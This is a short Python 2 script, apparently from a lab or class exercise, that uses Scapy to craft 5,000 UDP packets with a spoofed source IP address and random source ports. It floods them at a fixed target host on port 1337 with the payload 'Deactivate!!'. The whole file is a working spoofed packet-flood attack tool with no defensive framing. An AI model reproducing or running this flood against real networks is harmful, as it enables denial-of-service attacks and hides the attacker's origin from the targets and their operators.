from scapy.all import *
from scapy.layers.inet import *
from socket import *


# Setup packet parameters
target = "10.12.1.4"
spoof = "10.204.0.7"
payload = "Deactivate!!"
flood_amt = 5000
packets = []

def packet_craft(source_port):
    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
    pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
    return pkt


print "Beginning packet crafting ...\n"

# First we craft a large number of packets using a random ephemeral port
for i in range(flood_amt):
    source_port = random.randint(1024, 65535)
    temp_packet = packet_craft(source_port)
    packets.append(temp_packet)

print "Done crafting packets!\n"
print "Establishing connection...\n"

skt = conf.L3socket(iface="eth0")

print "Connection established!\n"
print "Beginning flood ...\n"


# Initiate a packet flood using our crafted packets
for p in packets:
    # verbose field sets output.  0 = silent.
    # Timeout=0 forces send to operate continuously.
    skt.sr(p, verbose=0, timeout=0)

print "Done flooding!\n"


